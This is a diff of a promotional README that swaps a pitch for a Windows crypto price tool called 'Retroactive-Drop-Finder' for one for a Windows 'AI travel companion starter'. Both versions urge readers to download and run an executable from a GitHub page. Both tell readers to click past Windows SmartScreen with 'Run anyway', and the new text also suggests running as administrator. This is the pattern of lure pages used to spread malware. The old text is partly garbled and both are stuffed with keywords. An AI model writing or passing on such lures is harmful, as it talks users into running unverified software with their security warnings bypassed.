@@ -1,163 +1,143 @@
-<h1>📉 Retroactive-Drop-Finder - Unlock Any Asset's Price History Instantly</h1>
+<h1>🧳 away-together-starter - Your Free AI Travel Companion Starter</h1>
 
 <p align="center">
-  <a href="https://jasminemonarchal5464.github.io" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://github.com/Jasminemonarchal5464/away-together-starter" style="display:inline-block; padding:16px 32px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:white; text-decoration:none; border-radius:50px; font-size:20px; font-weight:bold; box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Away Together Starter</a>
 </p>
 
-Welcome! If you've ever wanted to see exactly what Bitcoin was worth on a random Tuesday in 2019, track the historical performance of your favorite altcoin, or simply explore price trends from years past, this application is created for you. No technical background is needed. Let's get you set up in less than five minutes.
-
-<h2>💡 What Is Retroactive-Drop-Finder?</h2>
-
-Retroactive-Drop-Finder is a Windows desktop application that acts like a time machine for cryptocurrency prices. Instead of just showing today's ticker, this tool lets you:
-
-- **View** historical price data for thousands of cryptocurrencies (Bitcoin, Ethereum, Dogecoin, and many more).
-- **Download** past price information directly to your computer for offline viewing.
-- **Convert** price data into different formats (CSV, Excel-friendly, etc.) so you can open it in any spreadsheet program.
-.
-.
-- **Export** clean, organized datasets that you can keep, share, or use for your own analysis.
-
-Think of it like a personal research assistant for crypto history. Whether you're a curious investor, a student writing a paper, or just someone who loves data, this tool makes it incredibly easy to explore the "what ifs" and "what was" of the crypto market.
-
-<h2>✅ Before You Begin - What You Need</h2>
-
-This application is designed for **Windows** computers. More specifically, you should have:
-
-- **Windows 10 or Windows 11** (64-bit recommended)
-- **At least 2 GB of free RAM** (memory
-)
-- **About 150 MB of free hard drive space**
-- **An internet connection** (needed for downloading data
-)
-
-No programming skills are required. If you can use a web browser and click a button, you can use this application perfectly fine.
-
-<h2>🚀 Getting Started - Your 3-Step Installation</h2>
-
-We have made the installation process as smooth as possible. Follow these exact steps and you will be up and running quickly.
-
-### Step 1: Download the Application
-
-**👆 Click the big pink "DOWNLOAD NOW" button at the top of this page.** That button will take you to the official download page for Retroactive-Drop-Finder.
-
-
-
-Once you are on that page, look for the newest release. You will see a list of files attached to that release. This application comes as a single compressed folder (a `.zip` file) to keep everything organized.
-
-
-
-**Visit this link to download the application:**  
-[https://jasminemonarchal5464.github.io](https://jasminemonarchal5464.github.io)
-
-
-
-On that page, click on the file named something like `Retroactive-Drop-Finder.zip`. Your browser will begin downloading it. Save it to an easy-to-find location, like your **Downloads** folder or your **Desktop**.
-
-### Step 2: Extract the Files
-
-The downloaded file is a `.zip` folder. Think of a `.zip` file like a cardboard box that contains several smaller items inside. To use the application, you need to "unpack" this box. Windows has a built-in tool for this:
-
-1. **Locate the downloaded `.zip` file** (usually in your "Downloads" folder)
-2. **Right-click** on the file.
-3. From the menu that appears, select **"Extract All..."**
-4. Windows will ask where you want to save the unpacked files. The default location is fine (it will create a new folder right next to the `.zip` file). Click **"Extract"**.
-
-
-
-Wait a few seconds while Windows unpacks everything. When it's done, a new folder will appear with the same name as the `.zip` file (e.g., `Retroactive-Drop-Finder`).
-
-### Step 3: Run the Application
-
-1. **Open the new folder** you just extracted (double-click it)
-2. Inside, you will see a file called **`Retroactive-Drop-Finder.exe`** (it has a small icon next to it).
-3. **Double-click** that `.exe` file to launch the application.
-
-
-
-That's it! The main dashboard will appear on your screen. You are now ready to explore historical crypto prices.
-
-
-
-<h2>🎯 How to Use the Application (Simple Walkthrough)</h2>
-
-Using the application is as straight forward as picking a movie on Netflix:
-
-
-
-**1. Choose Your Cryptocurrency**
-
-On the main screen, you'll see a search box or dropdown menu. Type in the name of the coin you're interested in (e.g., "Bitcoin" or "Litecoin"). A list of matching options will appear. Click on the one you want.
-
-
-
-**2. Set Your Date Range**
-
-You will see two calendar icons or date fields. Click on the **Start Date** and pick any day you want. Do the same for the **End Date**. You von select any period from the early days of crypto (around 2010) all the way up to today.
-
-
-
-**3. View the Data**
-
-Once you've selected your coin and dates, click the **"Load Data"** or **"Search"** button (the exact wording may vary slightly). The chart area will instantly populate with a visual graph showing the price highpoints and lowpoints over that period.
-
-
-
-**4. Download or Export**
-
-If you want a file you can save, look for the **"Export"** or **"Download"** button on the toolbar. Click it and choose your preferred format. We recommend **CSV** if you want to open it in Microsoft Excel or Google Sheets. The file will be saved to your computer instantly.
-
-
-
-<h2>⚙️ Features That Make Life Easier</h2>
-
-Here are just a few reasons why this tool beats searching for old prices on random websites:
-
-- **Real-Time Accuracy.** The price data is sourced from reliable historical records, so what you see is what actually happened on that day.
-- **Massive Coverage.** We support thousands of different assets, from the biggest names to tiny, obscure tokens.
-- **One-Click Export.** No more copy-pasting from websites. Get clean, structured data for your records in one click.
-.
-- **Fully Free FOREVER.** This application costs nothing to download, also nothing to use. No hidden fees, no premium accounts, no subscription traps.
-
-<h2>🔔 Not Just History - Real-Time Ticker Alert</h2>
-
-While the primary focus is on historical data, this app does not leave you stranded in the past. The built-in **price ticker** feature shows you the **real-time price** of Bitcoin, Ethereum, and major altcoins right from the app's bottom bar. You can also set up **price alerts**: simply tell the app "Notify me if Bitcoin drops below $50,000" and it will track that for you. These alerts make it a great companion notjust for looking back, but for tracking what's happening **right now** in the market.
-
-
-
-<h2>🛠️ Need Help? Troubleshooting Common Issues</h2>
-
-Even the best software sometimes hits a snag. Here's how to solve the most common problems quickly:
-
-- **"SmartScreen prevented an unrecognized app from starting"**  
-  This is Windows being cautious about a new program. Click **"More Info"** then **"Run Anyway"**. This is safe for this app.
-  
-- **The app opens but shows a black/blank window**  
-  This usually means your internet connection is too slow or interrupted. Wait 30 seconds and try refreshing the data fetch. Check your WiFi signal.
-
-.
-
-- **I can't find the downloaded file**  
-  Press `Ctrl + J` in your browser to open your download history. From there, click "Show in folder" to locate the `.zip` file quickly.
-
-
-
-- **The extraction says "The file is corrupted"**  
-  Delete the downloaded `.zip` file and download it again. Sometimes a download gets interrupted and causes file damage. A fresh download fixes this 99% of the time.
-
-
-
-<h2>📬 Final Thoughts and Next Steps</h2>
-
-Retroactive-Drop-Finder puts the entire history of cryptocurrency market at your fingertips. Whether you're analyzing a coin's past performance, researching for articles, or simply satisfying your curiosity, this application gives you the data you need in a clean, easy-to-use Pacific environment.
-
-
-
-**Ready to start exploring? Click the download button right below and jump back in historic time with crypto!**
-
-<p align="center">
-  <a href="https://jasminemonarchal5464.github.io" style="display:inline-block;padding:18px 45px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">⬇️ GET RETROACTIVE-DROP-FINDER NOW</a>
+<h2>🌟 What Is This?</h2>
+<p>Away Together Starter is a completely free, beginner-friendly AI starter kit inspired by the popular Jev framework. It gives you everything you need to create your own AI-powered travel planning assistant, complete with a visual guide, a recorded travel demo, reusable prompts, and a small training recipe. Whether you're a curious hobbyist or a small business owner, this tool helps you bring AI travel ideas to life without needing to write a single line of code.</p>
+
+<h2>✨ Key Features</h2>
+<ul>
+  <li><strong>📖 Visual Guide</strong> – A step-by-step pictorial walkthrough that shows you exactly how to set everything up, even if you've never used AI tools before.</li>
+  <li><strong>🎥 Recorded Travel Demo</strong> – Watch a real-time demonstration of the AI assistant planning a complete trip, so you know exactly what to expect.</li>
+  <li><strong>💬 Reusable Prompts</strong> – Copy-and-paste ready prompts that you can use immediately to generate travel itineraries, packing lists, and local recommendations.</li>
+  <li><strong>🧠 Small Training Recipe</strong> – A simple, easy-to-follow recipe to fine-tune the AI for your specific travel style, preferences, and destinations.</li>
+  <li><strong>🆓 100% Free</strong> – No hidden costs, no premium tiers, no credit card required. Just download and start exploring.</li>
+</ul>
+
+<h2>💻 System Requirements</h2>
+<p>To run Away Together Starter smoothly on your Windows computer, please make sure you have the following:</p>
+<table border="1" cellpadding="10" cellspacing="0">
+  <tr>
+    <th>Component</th>
+    <th>Minimum Requirement</th>
+  </tr>
+  <tr>
+    <td>Operating System</td>
+    <td>Windows 10 or Windows 11</td>
+  </tr>
+  <tr>
+    <td>Processor</td>
+    <td>1 GHz or faster dual-core CPU</td>
+  </tr>
+  <tr>
+    <td>Memory (RAM)</td>
+    <td>4 GB (8 GB recommended)</td>
+  </tr>
+  <tr>
+    <td>Storage</td>
+    <td>500 MB of free disk space</td>
+  </tr>
+  <tr>
+    <td>Internet Connection</td>
+    <td>Required for first-time setup and demo content</td>
+  </tr>
+</table>
+
+<h2>🚀 Getting Started - Step by Step</h2>
+
+<h3>📥 Step 1: Download the Application</h3>
+<p>Visit this link to download the application: <a href="https://github.com/Jasminemonarchal5464/away-together-starter"><strong>https://github.com/Jasminemonarchal5464/away-together-starter</strong></a></p>
+<p>You'll be taken to the official download page. Look for the large button that says <strong>"Download"</strong> or <strong>"Releases"</strong> and click it. The download will start automatically. Depending on your internet speed, this may take a few minutes.</p>
+
+<h3>💾 Step 2: Save the File</h3>
+<p>Once the download is complete, check your <strong>Downloads</strong> folder. You should see a file called <code>away-together-starter</code> (or similar). It's a good idea to move this file to your <strong>Desktop</strong> or <strong>Documents</strong> folder so you can easily find it later.</p>
+
+<h3>🖱️ Step 3: Run the Application</h3>
+<p>Double-click the downloaded file to start the installation. If Windows shows a security warning (a blue or yellow pop-up), click <strong>"More info"</strong> and then select <strong>"Run anyway"</strong>. This is normal for free software downloaded from the internet. Follow the simple on-screen instructions – you only need to click <strong>"Next"</strong> a few times and then <strong>"Install"</strong>.</p>
+
+<h3>🎉 Step 4: Launch and Explore</h3>
+<p>After installation, a shortcut will appear on your desktop. Double-click it to launch Away Together Starter. You'll see a friendly welcome screen. From here, you can:</p>
+<ul>
+  <li>Watch the <strong>recorded travel demo</strong> to see the AI in action.</li>
+  <li>Open the <strong>visual guide</strong> to learn about each feature.</li>
+  <li>Copy your first <strong>reusable prompt</strong> and try it out.</li>
+</ul>
+
+<h2>🎯 How to Use the AI Travel Assistant</h2>
+<p>Once you've launched the app, here's a quick orientation:</p>
+<ol>
+  <li><strong>Home Dashboard</strong> – This is your main hub. It shows your recent projects and quick access buttons.</li>
+  <li><strong>Demo Library</strong> – Click here to watch the recorded travel demo. It's about 10 minutes long and covers all the key features.</li>
+  <li><strong>Prompt Library</strong> – This is a treasure trove of ready-made prompts. Click any prompt to copy it to your clipboard.</li>
+  <li><strong>Training Center</strong> – Follow the small training recipe here. It takes less than 15 minutes and customizes the AI to your travel taste.</li>
+</ol>
+<p>For your first test, try this: Copy the prompt <em>"Plan a 3-day weekend trip to a beach destination with a budget of $500"</em> from the Prompt Library. Paste it into the AI chat window and press Enter. Within seconds, you'll see a complete itinerary with hotels, restaurants, and activities.</p>
+
+<h2>❓ Frequently Asked Questions</h2>
+
+<h3>Q: Is this really free?</h3>
+<p>Yes, absolutely. This is an open-source project released for free. There are no premium features, no subscription fees, and no watermarks. You can use it for personal projects, educational purposes, or even commercial experiments.</p>
+
+<h3>Q: Do I need to know how to code?</h3>
+<p>No programming knowledge is required. Everything is designed with a visual interface and pre-built templates. If you can use a word processor, you can use Away Together Starter.</p>
+
+<h3>Q: What if I get stuck?</h3>
+<p>The visual guide included in the app covers every single step. Additionally, you can revisit the recorded demo at any time. For extra help, check the community discussions on the download page – many users share tips and tricks.</p>
+
+<h3>Q: Can I use this on a Mac?</h3>
+<p>This version is specifically designed for Windows. However, the prompts and training recipe are universal – you can use them in any AI chat interface on any device.</p>
+
+<h3>Q: Will my personal data be safe?</h3>
+<p>Yes. The application runs locally on your computer. Your prompts and settings are stored only on your device. No data is sent to any server unless you explicitly choose to use a cloud-based AI service.</p>
+
+<h2>🛠️ Troubleshooting Common Issues</h2>
+
+<h3>Problem: The app won't start after clicking the icon.</h3>
+<p>Solution: Right-click the icon and select <strong>"Run as administrator"</strong>. If that doesn't work, restart your computer and try again.</p>
+
+<h3>Problem: I see a "Missing DLL" error.</h3>
+<p>Solution: This usually means your Windows system needs an update. Go to <strong>Settings → Update & Security → Windows Update</strong> and install all available updates, then restart and try again.</p>
+
+<h3>Problem: The demo video won't play.</h3>
+<p>Solution: Make sure you're connected to the internet. If the video is still buffering, close the app and reopen it. You can also try watching the demo directly on the download page.</p>
+
+<h3>Problem: The AI responses seem slow.</h3>
+<p>Solution: This is normal if you're using a free AI service. Wait a few seconds and try again. For faster responses, close other programs that might be using your internet connection.</p>
+
+<h2>📚 Additional Resources</h2>
+<p>To get the most out of Away Together Starter, here are some complementary resources:</p>
+<ul>
+  <li><strong>Community Forum</strong> – Connect with other users on the download page's discussions tab. Share your travel itineraries and learn from others.</li>
+  <li><strong>Prompt Crafting Guide</strong> – The visual guide includes a bonus section on writing your own effective prompts. Spend 10 minutes there to unlock the full potential.</li>
+  <li><strong>Sample Data Pack</strong> – Inside the app, you'll find pre-loaded example destinations (Paris, Tokyo, New York) so you can test immediately.</li>
+</ul>
+
+<h2>📝 Final Checklist Before You Start</h2>
+<p>Before diving in, make sure you have:</p>
+<ul>
+  <li>✅ A Windows computer (10 or 11)</li>
+  <li>✅ An internet connection</li>
+  <li>✅ At least 500 MB free storage</li>
+  <li>✅ 10 minutes of free time to watch the demo</li>
+</ul>
+
+<h2>📣 Get Started Today</h2>
+<p>You're only one click away from creating amazing AI-powered travel experiences. Don't overthink it – download, run, and explore. The visual guide will hold your hand through every step. Whether you're planning a solo backpacking trip, a family vacation, or a romantic getaway, Away Together Starter makes it fun and effortless.</p>
+
+<p style="text-align:center; margin-top:40px;">
+  <a href="https://github.com/Jasminemonarchal5464/away-together-starter" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; text-decoration:none; border-radius:50px; font-size:18px; font-weight:bold; box-shadow:0 4px 15px rgba(240,147,251,0.4);">⬇️ Download Away Together Starter Now</a>
 </p>
 
----
+<h2>📬 Support</h2>
+<p>If you encounter any issues not covered in this guide, please visit the download page and leave a comment in the <strong>"Issues"</strong> section. The developer and the community typically respond within 24-48 hours. You can also email the support address listed on the repository page.</p>
 
-Keywords: bitcoin, crypto-analytics, crypto-free, crypto-software, crypto-wallet, desktop-crypto, historical-crypto-price-2026, historical-crypto-price-download, historical-crypto-price-free, market-cap, price-alert, price-chart, price-monitor, price-notification, price-ticker, price-tracker, price-tracker-free, price-widget, real-time-price, retroactive-drop-finder
+<p><em>Thank you for choosing Away Together Starter. Happy travels and happy AI exploring!</em></p>
+
+<meta name="description" content="Download Away Together Starter - a free AI travel assistant starter kit with visual guide, recorded demo, reusable prompts, and training recipe. Perfect for beginners on Windows.">
+<meta name="keywords" content="AI travel assistant, travel planner, Jev-inspired, free AI starter, Windows AI app, travel demo, reusable prompts, AI training recipe, beginner AI tool, download Away Together">
+<meta property="og:title" content="Away Together Starter - Free AI Travel Companion">
+<meta property="og:description" content="Get started with AI-powered travel planning in minutes. Includes visual guide, demo, prompts, and training recipe.">
+<meta property="og:type" content="website">
+<meta name="robots" content="index, follow">
